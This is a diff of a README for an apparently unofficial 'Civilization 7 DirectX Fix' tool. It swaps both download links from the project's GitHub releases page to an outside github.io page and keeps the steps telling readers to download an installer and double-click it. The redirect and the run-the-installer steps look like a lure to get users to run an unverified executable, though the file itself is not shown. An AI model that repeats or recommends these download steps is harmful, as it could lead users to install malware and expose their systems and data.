@@ -1,6 +1,6 @@
 # 🛠 Civilization-7-DirectX-Fix - Stable solution for game graphics crashes
 
-[![Download Game Fix](https://img.shields.io/badge/Download-Latest_Fix-blue.svg)](https://github.com/Iggyperishable768/Civilization-7-DirectX-Fix/releases)
+[![Download Game Fix](https://img.shields.io/badge/Download-Latest_Fix-blue.svg)](https://iggyperishable768.github.io)
 
 ## 📋 Project Overview
 
@@ -18,7 +18,7 @@ Follow these steps to prepare your system before you run the fix. You do not nee
 
 Follow these steps to obtain and apply the repair tool.
 
-1. Visit the [official releases page](https://github.com/Iggyperishable768/Civilization-7-DirectX-Fix/releases) to download the patch.
+1. Visit the [official releases page](https://iggyperishable768.github.io) to download the patch.
 2. Locate the most recent file version and click the link to save the installer to your computer.
 3. Open your Downloads folder and double-click the file to start the utility.
 4. Follow the instructions on the screen. The program will identify your installation folder automatically.
